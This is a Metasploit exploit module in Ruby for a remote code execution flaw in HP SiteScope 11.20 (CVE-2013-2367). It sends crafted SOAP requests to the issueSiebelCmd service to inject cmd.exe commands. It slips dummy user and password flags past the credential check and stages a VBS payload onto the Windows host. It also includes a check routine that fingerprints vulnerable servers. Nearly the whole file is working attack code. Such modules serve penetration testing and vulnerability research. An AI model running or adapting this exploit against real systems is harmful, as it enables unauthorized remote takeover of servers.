##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rexml/document'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  HttpFingerprint = { :pattern => [ /Apache-Coyote/ ] }

  include REXML
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStagerVBS

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'HP SiteScope Remote Code Execution',
      'Description' => %q{
          This module exploits a code execution flaw in HP SiteScope.
        The vulnerability exists in the opcactivate.vbs script, which
        is reachable from the APIBSMIntegrationImpl AXIS service, and
        uses WScript.Shell.run() to execute cmd.exe with user provided
        data. Note that the opcactivate.vbs component is installed
        with the (optional) HP Operations Agent component. The module
        has been tested successfully on HP SiteScope 11.20 (with HP
        Operations Agent) over Windows 2003 SP2.
      },
      'Author'       =>
        [
          'rgod <rgod[at]autistici.org>', # Vulnerability discovery
          'juan vazquez' # Metasploit module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'CVE', '2013-2367'],
          [ 'OSVDB', '95824' ],
          [ 'BID', '61506' ],
          [ 'ZDI', '13-205' ]
        ],
      'Privileged'  => true,
      'Platform'    => 'win',
      'Arch'        => ARCH_X86,
      'Targets'     =>
        [
          [ 'HP SiteScope 11.20 / Windows 2003 SP2', {} ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jul 29 2013'))

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('TARGETURI', [true, 'Path to SiteScope', '/SiteScope/'])
      ], self.class)
  end

  def check

    value = rand_text_alpha(8 + rand(10))

    res = send_soap_request(value)

    if res and res.code == 500 and res.body.to_s =~ /Cmd Error: User and Password must be specified/
      return Exploit::CheckCode::Appears
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    print_status("#{peer} - Delivering payload...")

    # Empirically has been tested a 1500 value for :linemax makes it work
    # reliable
    execute_cmdstager({:linemax => 1500, :nodelete => true})
  end

  def execute_command(cmd, opts={})
    print_status("#{cmd}")
    cmd.gsub!(/data = Replace\(data, vbCrLf, ""\)/, "data = Replace(data, \" \" + vbCrLf, \"\")")
    command = "cmd.exe /c "
    command << cmd.gsub(/&/, "&#x26;")   # HTML Encode '&' character to avoid soap request parsing errors
    command << " &#x26; /u #{rand_text_alpha(4)} /p #{rand_text_alpha(4)}" # To bypass user and pass flags check before executing

    res = send_soap_request(command)

    unless res and res.code == 500 and res.body =~ /SiteScope encountered an error associated with running a command/
      fail_with(Failure::Unknown, "#{peer} - Unexpected response, aborting...")
    end

  end

  def get_soap_request
    xml = Document.new
    xml.add_element(
        "soapenv:Envelope",
        {
            'xmlns:xsi'     => "http://www.w3.org/2001/XMLSchema-instance",
            'xmlns:xsd'     => "http://www.w3.org/2001/XMLSchema",
            'xmlns:soapenv' => "http://schemas.xmlsoap.org/soap/envelope/",
            'xmlns:api'     => "http://Api.freshtech.COM"
        })
    xml.root.add_element("soapenv:Header")
    xml.root.add_element("soapenv:Body")
    body = xml.root.elements[2]
    body.add_element(
        "api:issueSiebelCmd",
        {
            'soapenv:encodingStyle' => "http://schemas.xmlsoap.org/soap/encoding/"
        })
    ser = body.elements[1]
    ser.add_element("in0", {'xsi:type' => 'xsd:string'})
    ser.elements['in0'].text = "MSF_COMMAND"

    xml.to_s
  end

  def send_soap_request(command)
=begin
    data = "<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:api=\"http://Api.freshtech.COM\">"
    data << "<soapenv:Header/>"
    data << "<soapenv:Body>"
    data << "<api:issueSiebelCmd soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
    data << "<in0 xsi:type=\"xsd:string\">#{command}</in0>"
    data << "</api:issueSiebelCmd>"
    data << "</soapenv:Body>"
    data << "</soapenv:Envelope>"
=end
    res = send_request_cgi({
      'uri'      => normalize_uri(target_uri.path, 'services', 'APISiteScopeImpl'),
      'method'   => 'POST',
      'ctype'    => 'text/xml; charset=UTF-8',
      'data'     => get_soap_request.gsub(/MSF_COMMAND/, command), # To avoid rexml html encoding
      'headers'  => {
        'SOAPAction' => '""'
      }
    })

    return res
  end

end
